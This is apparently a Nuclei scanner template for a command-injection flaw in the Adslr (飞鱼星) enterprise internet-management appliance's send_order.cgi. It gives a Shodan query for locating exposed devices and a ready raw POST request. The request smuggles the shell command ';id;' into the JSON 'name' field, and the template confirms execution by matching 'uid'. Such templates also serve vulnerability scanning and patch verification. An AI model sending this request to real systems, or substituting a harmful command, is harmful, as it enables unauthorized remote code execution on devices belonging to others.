id: adslr_send_order_cgi_RCE

info:
  name: adslr_send_order_cgi_RCE
  author: HK
  severity: high
  description: 飞鱼星企业级智能上网行为管理系统 send_order.cgi 任意命令执行
  metadata:
    max-request: 1
    shodan-query: body="http://www.adslr.com/product/"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /send_order.cgi?parameter=operation HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
    Accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 40

    {"opid":"1","name":";id;","type":"rest"}

  redirects: true
  matchers-condition: and
  matchers:
    - type: word
      part: header
      words:
        - uid